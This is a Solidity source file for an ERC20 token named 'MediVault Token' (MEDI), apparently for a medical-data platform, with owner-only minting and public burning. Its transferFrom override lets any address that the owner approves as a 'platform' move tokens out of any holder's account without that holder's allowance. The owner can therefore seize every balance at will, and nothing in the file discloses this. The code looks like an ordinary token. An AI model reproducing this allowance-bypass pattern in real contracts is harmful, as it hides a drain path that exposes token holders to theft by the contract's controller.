// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MEDIToken is ERC20, Ownable {
    mapping(address => bool) public platformAddresses;

    event TokensMinted(address indexed to, uint256 amount);
    event TokensBurned(address indexed from, uint256 amount);
    event PlatformApproved(address indexed platform);

    constructor() ERC20("MediVault Token", "MEDI") Ownable(msg.sender) {
        _mint(msg.sender, 10_000_000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
        emit TokensMinted(to, amount);
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
        emit TokensBurned(msg.sender, amount);
    }

    function approvePlatform(address platform) external onlyOwner {
        platformAddresses[platform] = true;
        emit PlatformApproved(platform);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (platformAddresses[msg.sender]) {
            _transfer(from, to, amount);
            return true;
        }
        return super.transferFrom(from, to, amount);
    }
}
